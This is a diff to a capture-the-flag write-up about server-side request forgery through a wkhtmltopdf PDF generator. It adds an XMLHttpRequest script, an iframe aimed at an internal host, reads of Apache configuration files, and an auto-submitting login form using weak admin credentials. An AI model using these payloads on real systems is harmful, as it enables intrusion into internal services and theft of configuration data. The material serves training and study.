@@ -71,7 +71,7 @@ Another way is to use XMLHTTPRequest, this would work probably because SOP is gu
 
 #####  Found a local website
 
-```
+```javascript
 <script>
     x = new XMLHttpRequest;
     x.onload = function(){
@@ -89,9 +89,13 @@ Another way is to use XMLHTTPRequest, this would work probably because SOP is gu
 127.0.0.1 topsecret.local
 ```
 
-##### Get the flag
+##### Read the contents of `topsecret.local`
 
-Directly curling with modified Host header to the server would not work because I check for `$_SERVER['REMOTE_ADDR']`, only serve the request if `$_SERVER['REMOTE_ADDR'] === "127.0.0.1"`
+Directly curling with modified Host header to the server would not work because the website is serving at 127.0.0.1, refer to the following configuration:
+
+```
+<VirtualHost 127.0.0.1:80>
+```
 
 Need to let wkthmltopdf to request for us
 
@@ -99,12 +103,33 @@ Need to let wkthmltopdf to request for us
 <iframe src="http://topsecret.local" width=600 height=600> </iframe>
 ```
 
-And it's just a simple login form, with weak credentials being used. Craft a auto-submitting form will give you the flag
+The website content can be viewed in the generated pdf.
+
+And it's just a simple login form.(with weak credentials being used.)
+
+##### Find the parameters
+
+Need to read `/etc/apache2/apache2.conf` to find another virtual host configuration file at `/etc/apache2/sites-enabled/topsecret.local.conf`, then read it to find the document path at `/var/www/70p53CR37/`, then read `/var/www/70p53CR37/index.html` to find the correct parameters to be used in the login request:
 
 ```html
-<form id='asdf' action="http://topsecret.local" method="POST">
-<input name='username' value='admin'>
-<input name='password' value='admin'>
+           <div class="form-group">
+                <label>Username</label>
+                <input type="text" name="username_VmyK7y39pX99A">
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" name="password_6FB8YUthKI3dK">
+            </div>
+```
+
+##### Get the flag
+
+with weak credentials being used. Craft a auto-submitting form will give you the flag
+
+```html
+<form id='asdf' action="http://topsecret.local/login.php" method="POST">
+<input name='username_VmyK7y39pX99A' value='admin'>
+<input name='password_6FB8YUthKI3dK' value='admin'>
 <form>
 <script>
 document.getElementById('asdf').submit();
@@ -120,5 +145,4 @@ the same as key concepts?
 ```
 greyhats{7h12_12_MOr3_7HaN_AN_55rf}
 ```
-
 
